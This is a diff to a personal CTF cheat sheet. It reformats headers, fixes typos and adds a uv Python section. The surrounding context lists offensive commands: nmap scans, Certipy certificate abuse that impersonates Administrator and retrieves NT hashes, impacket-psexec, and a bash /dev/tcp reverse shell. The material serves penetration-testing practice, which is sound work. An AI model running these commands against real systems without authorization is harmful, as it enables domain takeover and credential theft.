@@ -6,7 +6,7 @@ title: CTF Cheat Sheet
 
 # CTF CheatSheet
 
-### UPDATE DATE: 25 Mar 2026
+### UPDATE DATE: 26 Mar 2026
 * TOC
 {:toc}
 
@@ -15,7 +15,7 @@ title: CTF Cheat Sheet
 ```bash
 sudo rustscan -a <hostname> -- -sCV -oA <filename>
 
-sudo nmap <hostname> -sT -Pn -n -sCV -p- -T4 --min-rate 5000 --max-retires 2 -oA <filename>
+sudo nmap <hostname> -sT -Pn -n -sCV -p- -T4 --min-rate 5000 --max-retries 2 -vv -oA <filename>
 ```
 
 # 🜂 BloodHound
@@ -47,7 +47,7 @@ rusthound-ce --domain <domain_name> -k -no-pass
 
 ---
 
-# SMB (AD)
+# 🜂 SMB (AD)
 
 ## smbclient
 
@@ -74,8 +74,7 @@ nxc smb <target> -u <user> -p <password> --generate-hosts-file <hosts_file>
 
 nxc ldap <target> -u <user> -p <password> -M pre2k
 
-NOTE: uv - An extremely fast Python package and project manager, written in Rust.
-(https://github.com/astral-sh/uv)
+Run with UV:
 
 uv run nxc smb <target> -u <user> -p <password>
 ```
@@ -97,7 +96,7 @@ impacket-addcomputer -computer-name <name> -computer-pass <password> domain/user
 ```bash
 certipy-ad
 
-certipy find -username <username> -hashes <:ntlm_hash> -dc-ip <ip_address> -vulnerable
+certipy find -username <username> -hashes <:ntlm_hash> -dc-ip <ip_address> -vulnerable -stdout
 
 # Request cert and update the UPN of Administrator
 certipy req -u <username> -hashes <:ntlm_hash> -ca <ca_name> -template <ca_template> -upn <administrator> -dc-ip <ip_address> -sid <sid>
@@ -105,7 +104,7 @@ certipy req -u <username> -hashes <:ntlm_hash> -ca <ca_name> -template <ca_templ
 certipy account -u <username> -p <password> -dc-ip <ip_address> -user <ca_svc> -upn <username> update
 
 # User certificate to request the NT Hash
-certipy auth -dc-ip ip_address -pfx administrator.pfx -username administrator -domain domain_name
+certipy auth -dc-ip <ip_address> -pfx administrator.pfx -username administrator -domain <domain_name>
 ```
 
 ## Evil-winrm
@@ -151,7 +150,7 @@ python3 generate-ad-username/ADGenerator.py names.csv
 
 ---
 
-# Kerberos Auth
+# 🜂 Kerberos Auth
 
 ```bash
 
@@ -191,21 +190,15 @@ Enter new password:
 
 ---
 
-# Remote Access
+# 🜂 Remote Access
 
 ```bash
 impacket-psexec <domain_name>/<username>:'<password>'@<target>
 ```
 
-# Web Server
-
-```bash
-python3 -m http.server <8080:port> -d <directory>
-```
-
 ---
 
-# Web Enumeration
+# 🜂 Web Enumeration
 
 ## **Files or Directories**
 
@@ -246,7 +239,7 @@ ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames.txt:HFU
 
 ---
 
-# Vulnerability Scanner
+# 🜂 Vulnerability Scanner
 
 ```bash
 (remote scan)
@@ -260,7 +253,7 @@ nuclei -u <folder_name> -file
 
 ---
 
-# SHELLS
+# 🜂 SHELLS
 
 ## Listener
 
@@ -276,8 +269,6 @@ penelope -i tun0 -p 1339
 ## Reverse Shell
 
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-https://www.revshells.com/
-Hack Tools - FireFox Add-On
 
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
@@ -307,9 +298,11 @@ stty size
 
 ---
 
-# Python Virtual Environment
+# 🜂 Python
 
-```python
+## Python Virtual Environment
+
+```bash
 python3 -m venv venv
 source venv/bin/activate
 pip3 install .
@@ -333,7 +326,62 @@ source my_python2_env/bin/activate
 python your_script.py
 ```
 
-# Walkthroughs
+## PIPX
+
+```bash
+pipx list
+
+pipx uninstall <app_name>
+```
+
+## UV (pipx replacement)
+
+```bash
+* NOTE: uv - An extremely fast Python package and project manager, written in Rust.
+A single tool to replace pip, pip-tools, pipx, poetry, pyenv, twine, virtualenv, and more.
+- https://github.com/astral-sh/uv
+- https://0xdf.gitlab.io/cheatsheets/uv#scripts
+- Python UV for Hackers - https://youtu.be/G36QXtBXKBQ?si=TKTQd7lRfZIGwy8n
+
+* INSTALL UV:
+# On macOS and Linux.
+curl -LsSf https://astral.sh/uv/install.sh | sh
+
+* UPDATE:
+uv self update
+
+* INSTALL TOOL:
+uv tool install <app_name>
+
+* PYTHON VERSIONS
+uv python list
+uv tool install --python 3.12 <app_name>
+uv python uninstall 3.12
+
+* WORKFLOW:
+$ git clone https://github.com/test/app
+$ cd app
+$ uv add --script app.py -r requirements.txt 
+$ uv run app.py
+
+* RUN LIKE BINARY:
+$ head app.py 
+#!/usr/bin/env -S uv run --script
+# /// script
+# requires-python = ">=3.12"
+# dependencies = [
+#     "impacket",
+#     "ldap3",
+# ]
+```
+
+## Web Server
+
+```bash
+python3 -m http.server <8080:port> -d <directory>
+```
+
+# 🜂 Walkthroughs
 
 ```html
 https://0xdf.gitlab.io/
@@ -341,9 +389,16 @@ https://0xdf.gitlab.io/
 
 ---
 
-# Resources
+# 🜂 Resources
 
 ```html
+
+# Hacking Articles
+https://www.hackingarticles.in/
+
+# HackTricks
+https://hacktricks.wiki/en/index.html
+
 # GTFObins
 https://gtfobins.github.io/
 
